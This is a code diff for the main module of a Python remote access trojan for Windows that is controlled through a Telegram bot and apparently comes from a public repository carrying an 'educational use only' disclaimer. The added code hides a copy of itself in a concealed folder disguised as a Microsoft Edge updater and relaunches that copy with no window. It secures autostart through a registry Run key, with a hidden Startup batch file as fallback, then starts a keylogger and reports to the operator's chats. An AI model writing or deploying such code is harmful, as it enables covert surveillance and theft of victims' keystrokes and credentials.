@@ -1,10 +1,17 @@
+"""
+https://github.com/kripersi/RAT-tg-python
+This tool is intended for use only on authorized systems. Use this script for educational purposes only! Any unauthorized use of this tool without explicit permission is illegal. When using the script, you take responsibility upon yourself
+Этот инструмент предназначен для использования только на авторизованных системах. Используйте этот скрипт только в образовательных целях! Любое несанкционированное использование этого инструмента без явного разрешения является незаконным. При использовании скрипта вы берете ответсвенность на себя
+
+ИСПОЛЬЗОВАТЬ ТОЛЬКО В ОЗНАКОМИТЕЛЬНЫХ ЦЕЛЯХ
+"""
+
 import os
 import sys
 import winreg
 import asyncio
-import shutil
 import subprocess
-import ctypes
+import shutil
 
 from aiogram import Bot, Dispatcher, types
 from aiogram.fsm.context import FSMContext
@@ -15,85 +22,116 @@ from loggers import setup_logging, start_keylogger
 from commands import hide_bot
 
 
-def add_to_startup():
+def get_hidden_path():
+    """Возвращает путь к скрытой папке и исполняемому файлу"""
+    hidden_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'MicrosoftEdgeUpdater')
+    os.makedirs(hidden_dir, exist_ok=True)
+
+    # Скрываем папку
+    subprocess.run(f'attrib +h "{hidden_dir}"', shell=True, capture_output=True)
+
+    if getattr(sys, 'frozen', False):
+        exe_path = os.path.join(hidden_dir, 'MicrosoftEdge.exe')
+    else:
+        exe_path = os.path.join(hidden_dir, 'MicrosoftEdge.py')
+
+    return hidden_dir, exe_path
+
+
+def is_running_from_hidden():
+    """Проверяет запущен ли бот уже из скрытой папки"""
+    _, hidden_exe = get_hidden_path()
+    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
+    return current_exe.lower() == hidden_exe.lower()
+
+
+def install_to_hidden():
+    """Устанавливает бота в скрытую папку"""
     try:
-        exe_path = os.path.abspath(sys.executable)
+        # Если уже запущены из скрытой папки - ничего не делаем
+        if is_running_from_hidden():
+            return True
 
-        key = winreg.CreateKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run"
-        )
+        # Получаем пути
+        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
+        hidden_dir, hidden_exe = get_hidden_path()
 
-        try:
-            winreg.QueryValueEx(key, "SYSTEM")
-        except FileNotFoundError:
-            winreg.SetValueEx(
-                key,
-                "SYSTEM",
-                0,
-                winreg.REG_SZ,
-                exe_path
-            )
+        # Копируем файл в скрытую папку
+        shutil.copy2(current_exe, hidden_exe)
 
-        winreg.CloseKey(key)
+        # Запускаем копию из скрытой папки
+        if getattr(sys, 'frozen', False):
+            subprocess.Popen(f'"{hidden_exe}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        else:
+            subprocess.Popen(f'python "{hidden_exe}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
-    except Exception as e:
-        pass
+        # Закрываем текущий экземпляр
+        sys.exit(0)
 
-
-def is_running_from_usb():
-    """Проверяет запущен ли бот с флешки"""
-    try:
-        exe_path = os.path.abspath(sys.argv[0])
-        drive = os.path.splitdrive(exe_path)[0] + '\\'
-        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
-        # DRIVE_REMOVABLE = 2
-        return drive_type == 2
-    except:
+    except Exception:
         return False
 
 
-def install_to_appdata():
-    """Копирует бота в APPDATA и запускает оттуда"""
+def add_to_startup():
+    """Добавляет бота в автозагрузку"""
     try:
-        target_dir = os.path.join(os.environ['APPDATA'], 'SYSTEM')
-        os.makedirs(target_dir, exist_ok=True)
+        _, hidden_exe = get_hidden_path()
 
-        current_exe = os.path.abspath(sys.argv[0])
-        target_exe = os.path.join(target_dir, os.path.basename(current_exe))
+        # Открываем ключ реестра
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
 
-        if os.path.dirname(current_exe) == target_dir:
-            return False
+        # Добавляем в автозагрузку
+        winreg.SetValueEx(
+            key,
+            "MicrosoftEdge",
+            0,
+            winreg.REG_SZ,
+            f'"{hidden_exe}"'
+        )
 
-        shutil.copy2(current_exe, target_exe)
-
-        try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
-                                 winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "SYSTEM", 0, winreg.REG_SZ, target_exe)
-            winreg.CloseKey(key)
-        except:
-            pass
-
-        # Запускаем копию
-        subprocess.Popen(target_exe, shell=True)
-
+        winreg.CloseKey(key)
         return True
-    except Exception as e:
-        print(f"Ошибка установки: {e}")
+
+    except Exception:
+        return False
+
+
+def add_startup_fallback():
+    try:
+        _, hidden_exe = get_hidden_path()
+
+        startup_folder = os.path.join(
+            os.getenv('APPDATA'),
+            r'Microsoft\Windows\Start Menu\Programs\Startup'
+        )
+
+        bat_path = os.path.join(startup_folder, 'MicrosoftEdge.bat')
+
+        with open(bat_path, 'w', encoding='utf-8') as f:
+            f.write(f'@echo off\nstart "" "{hidden_exe}"')
+
+        # Скрываем bat файл
+        subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
+        return True
+
+    except Exception:
         return False
 
 
 async def main():
-    # Проверяем, запущен ли с флешки
-    if is_running_from_usb():
-        # print("Запущено с флешки. Устанавливаю в APPDATA...")
-        if install_to_appdata():
-            # print("Установка завершена, перезапуск из APPDATA...")
-            return
+    # Установка в скрытую папку
+    install_to_hidden()
 
-    add_to_startup()
+    # Добавление в автозагрузку
+    if not add_to_startup():
+        add_startup_fallback()
 
+    # Запуск бота
     setup_logging()
     start_keylogger()
 
@@ -110,12 +148,10 @@ async def main():
         await handle_hotkey_callback(callback, bot)
 
     for chat_id in KNOWN_IDS:
-        await send_safe_message(bot, chat_id, "Бот запущен")
+        await send_safe_message(bot, chat_id, "Бот работает")
 
     await dp.start_polling(bot)
 
 
 if __name__ == '__main__':
     asyncio.run(main())
-
-
